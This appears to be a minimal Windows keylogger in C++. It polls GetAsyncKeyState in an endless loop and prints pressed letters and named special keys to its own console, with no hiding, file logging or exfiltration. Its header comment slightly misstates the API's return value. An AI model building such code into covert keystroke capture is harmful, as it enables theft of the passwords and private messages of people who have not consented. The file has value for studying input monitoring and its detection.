// Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//// GetAsyncKeyState() is a function that returns the state of a key. If the key is pressed, it returns 0b1. If the key is not pressed, it returns 0b0.
// The function takes a parameter of the key to check. The key is represented by a virtual key code. A list of virtual key codes can be found here: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

#include "pch.h"
#include <iostream>
#include <Windows.h>

int main()
{
	while (true)
	{
		for (int i = 0; i < 256; i++)
		{
			if (GetAsyncKeyState(i) & 0b1)
			{
				if (std::isupper(i))
				{
					std::cout << static_cast<char>(i) << "\n";
				}
				else if (i == VK_ESCAPE)
				{
					std::cout << "[Escape]\n";
				}
				else if (i == VK_RETURN)
				{
					std::cout << "[Return]\n";
				}
				else if (i == VK_SPACE)
				{
					std::cout << "[Space]\n";
				}
				else if (i == VK_BACK)
				{
					std::cout << "[Backspace]\n";
				}
				else if (i == VK_TAB)
				{
					std::cout << "[Tab]\n";
				}
				else if (i == VK_SHIFT)
				{
					std::cout << "[Shift]\n";
				}
				else if (i == VK_CONTROL)
				{
					std::cout << "[Control]\n";
				}
				else if (i == VK_MENU)
				{
					std::cout << "[Alt]\n";
				}
				else if (i == VK_CAPITAL)
				{
					std::cout << "[Caps Lock]\n";
				}
				else if (i == VK_LWIN)
				{
					std::cout << "[Left Windows]\n";
				}
				else if (i == VK_RWIN)
				{
					std::cout << "[Right Windows]\n";
				}
				else if (i == VK_APPS)
				{
					std::cout << "[Applications]\n";
				}
				else if (i == VK_SNAPSHOT)
				{
					std::cout << "[Print Screen]\n";
				}
				else if (i == VK_SCROLL)
				{
					std::cout << "[Scroll Lock]\n";
				}
				else if (i == VK_PAUSE)
				{
					std::cout << "[Pause]\n";
				}
				else if (i == VK_INSERT)
				{
					std::cout << "[Insert]\n";
				}
				else if (i == VK_HOME)
				{
					std::cout << "[Home]\n";
				}
				else if (i == VK_PRIOR)
				{
					std::cout << "[Page Up]\n";
				}
				else if (i == VK_DELETE)
				{
					std::cout << "[Delete]\n";
				}
				else if (i == VK_END)
				{
					std::cout << "[End]\n";
				}
				else if (i == VK_NEXT)
				{
					std::cout << "[Page Down]\n";
				}
				else if (i == VK_LEFT)
				{
					std::cout << "[Left Arrow]\n";
				}
				else if (i == VK_UP)
				{
					std::cout << "[Up Arrow]\n";
				}
				else if (i == VK_RIGHT)
				{
					std::cout << "[Right Arrow]\n";
				}
				else if (i == VK_DOWN)
				{
					std::cout << "[Down Arrow]\n";
				}
				else if (i == VK_NUMLOCK)
				{
					std::cout << "[Num Lock]\n";
				}
				else if (i == VK_DIVIDE)
				{
					std::cout << "[Numpad /]\n";
				}
				else if (i == VK_MULTIPLY)
				{
					std::cout << "[Numpad *]\n";
				}
				else if (i == VK_SUBTRACT)
				{
					std::cout << "[Numpad -]\n";
				}
				else if (i == VK_ADD)
				{
					std::cout << "[Numpad +]\n";
				}
				else if (i == VK_DECIMAL)
				{
					std::cout << "[Numpad .]\n";
				}
				else if (i == VK_NUMPAD0)
				{
					std::cout << "[Numpad 0]\n";
				}
				else if (i == VK_NUMPAD1)
				{
					std::cout << "[Numpad 1]\n";
				}
				else if (i == VK_NUMPAD2)
				{
					std::cout << "[Numpad 2]\n";
				}
				else if (i == VK_NUMPAD3)
				{
					std::cout << "[Numpad 3]\n";
				}
				else if (i == VK_NUMPAD4)
				{
					std::cout << "[Numpad 4]\n";
				}
				else if (i == VK_NUMPAD5)
				{
					std::cout << "[Numpad 5]\n";
				}
				else if (i == VK_NUMPAD6)
				{
					std::cout << "[Numpad 6]\n";
				}
				else if (i == VK_NUMPAD7)
				{
					std::cout << "[Numpad 7]\n";
				}
				else if (i == VK_NUMPAD8)
				{
					std::cout << "[Numpad 8]\n";
				}
				else if (i == VK_NUMPAD9)
				{
					std::cout << "[Numpad 9]\n";
				}
			}
		}
	}
}
